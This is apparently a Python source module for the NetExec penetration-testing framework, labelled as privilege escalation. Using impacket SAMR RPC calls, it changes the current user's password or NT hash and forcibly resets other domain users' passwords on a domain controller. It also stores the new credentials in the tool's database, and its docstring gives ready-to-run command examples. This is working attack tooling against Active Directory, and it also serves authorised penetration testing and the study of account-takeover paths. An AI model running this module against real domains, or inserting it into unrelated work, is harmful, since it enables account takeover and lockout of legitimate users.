from dataclasses import dataclass
from sys import exit

from impacket.dcerpc.v5 import samr, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from nxc.helpers.misc import CATEGORY
from nxc.helpers.rpc import NXCRPCConnection
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    """
    Module for changing or resetting user passwords
    Module by Fagan Afandiyev, termanix and NeffIsBack
    """

    name = "change-password"
    description = "Change or reset user passwords via various protocols"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    @dataclass
    class ResultData:
        username: str
        domain: str
        credential_kind: str
        new_secret: str
        completed: bool = False
        stored: bool = False
        credential_id: int | None = None

    result_type = ResultData

    def options(self, context, module_options):
        """
        Required (one of):
        NEWPASS     The new password of the user.
        NEWNTHASH   The new NT hash of the user.

        Optional:
        USER        The user account if the target is not the current user.

        Examples
        --------
        If STATUS_PASSWORD_MUST_CHANGE, STATUS_PASSWORD_EXPIRED or STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT (Change password for current user)
            netexec smb <DC_IP> -u username -p oldpass -M change-password -o NEWNTHASH='nthash'
            netexec smb <DC_IP> -u username -H oldnthash -M change-password -o NEWPASS='newpass'

        If want to change other user's password (with forcechangepassword priv or admin rights)
            netexec smb <DC_IP> -u username -p password -M change-password -o USER='target_user' NEWPASS='target_user_newpass'
            netexec smb <DC_IP> -u username -p password -M change-password -o USER='target_user' NEWNTHASH='target_user_newnthash'
        """
        self.newpass = module_options.get("NEWPASS")
        self.newhash = module_options.get("NEWNTHASH")
        self.target_user = module_options.get("USER")

        if bool(self.newpass) == bool(self.newhash):
            context.log.fail("Specify exactly one of NEWPASS or NEWNTHASH")
            exit(1)

    def authenticate(self, context, connection, protocol, anonymous=False):
        # Authenticate to the target using DCE/RPC with either user credentials or a null session. Establishes a connection and binds to the SAMR service.
        try:
            if anonymous:
                string_binding = epm.hept_map(connection.host, samr.MSRPC_UUID_SAMR, protocol=protocol)
                dce = NXCRPCConnection(connection).connect(
                    None,
                    samr.MSRPC_UUID_SAMR,
                    string_binding=string_binding,
                    set_remote_host=connection.host,
                    anonymous_rpc=True,
                )
                context.log.info("Connecting with null session credentials.")
            else:
                dce = NXCRPCConnection(connection).connect(r"\samr", samr.MSRPC_UUID_SAMR)
                context.log.info(f"Connecting as {connection.domain}\\{connection.username}")

            context.log.info("[+] Successfully connected to DCE/RPC")
            context.log.info("[+] Successfully bound to SAMR")
            return dce
        except DCERPCException as e:
            context.log.fail(f"DCE/RPC Exception: {e!s}")
            raise

    def on_login(self, context, connection):
        self.context = context
        target_username = self.target_user or connection.username
        target_domain = connection.domain
        self.oldpass = connection.password
        self.oldhash = connection.nthash
        new_nthash = self.newhash.rsplit(":", 1)[-1] if self.newhash else ""
        data = self.ResultData(target_username, target_domain,
                               "hash" if self.newhash else "plaintext", new_nthash or self.newpass)
        errors = []
        self.dce = None
        self.handles = []
        try:
            try:
                self.dce = self.authenticate(context, connection, protocol="ncacn_np", anonymous=False)
            except Exception as e:
                if any(code in str(e) for code in ("STATUS_PASSWORD_MUST_CHANGE", "STATUS_PASSWORD_EXPIRED",
                                                    "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT")):
                    context.log.info("Password change requires a null-session SAMR connection")
                    self.dce = self.authenticate(context, connection, protocol="ncacn_ip_tcp", anonymous=True)
                else:
                    raise
            self.smb_samr_change(context, connection, target_username, self.oldhash, self.newpass, new_nthash)
            data.completed = True
            user_ids = [row._mapping["id"] for row in (context.db.get_user(target_domain, target_username) or [])]
            if user_ids:
                context.db.remove_credentials(user_ids)
            context.db.add_credential(data.credential_kind, target_domain, target_username, data.new_secret)
            matches = [row._mapping["id"] for row in (context.db.get_user(target_domain, target_username) or [])
                       if row._mapping["credtype"] == data.credential_kind
                       and row._mapping["password"] == data.new_secret]
            if len(matches) != 1:
                raise RuntimeError("Changed credential was not found in the NetExec database")
            data.credential_id = matches[0]
            data.stored = True
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
        finally:
            if self.dce is not None:
                for handle in reversed(self.handles):
                    try:
                        samr.hSamrCloseHandle(self.dce, handle)
                    except Exception as e:
                        errors.append(f"Closing SAMR handle: {e}")
                try:
                    self.dce.disconnect()
                except Exception as e:
                    errors.append(f"Closing SAMR connection: {e}")
        for error in errors:
            context.log.fail(error)
        return ActionResult("smb", self.name, connection.host,
                            ResultStatus.SUCCESS if data.completed and data.stored and not errors else ResultStatus.FAILED,
                            data, error="; ".join(errors) or None)

    def smb_samr_change(self, context, connection, target_username, oldHash, newPassword, newHash):
        # Reset the password for a different user
        if target_username != connection.username:
            user_handle = self.samr_open_user(connection, target_username)
            samr.hSamrSetNTInternal1(self.dce, user_handle, newPassword, newHash)
            context.log.success(f"Successfully changed password for {target_username}")
        else:
            # Change password for the current user
            if newPassword:
                # Change the password with new password
                samr.hSamrUnicodeChangePasswordUser2(self.dce, "\x00", target_username, self.oldpass, newPassword, "", oldHash)
            else:
                # Change the password with new hash
                user_handle = self.samr_open_user(connection, target_username)
                samr.hSamrChangePasswordUser(self.dce, user_handle, self.oldpass, "", oldHash, "aad3b435b51404eeaad3b435b51404ee", newHash)
                context.log.highlight("Note: Target user must change password at next logon.")
            context.log.success(f"Successfully changed password for {target_username}")

    def samr_open_user(self, connection, username):
        """Connect to the target server and retrieve the user handle"""
        server_handle = samr.hSamrConnect(self.dce, connection.host + "\x00")["ServerHandle"]
        self.handles.append(server_handle)
        domain_sid = samr.hSamrLookupDomainInSamServer(self.dce, server_handle, connection.domain)["DomainId"]
        domain_handle = samr.hSamrOpenDomain(self.dce, server_handle, domainId=domain_sid)["DomainHandle"]
        self.handles.append(domain_handle)
        user_rid = samr.hSamrLookupNamesInDomain(self.dce, domain_handle, (username,))["RelativeIds"]["Element"][0]
        user_handle = samr.hSamrOpenUser(self.dce, domain_handle, userId=user_rid)["UserHandle"]
        self.handles.append(user_handle)
        return user_handle
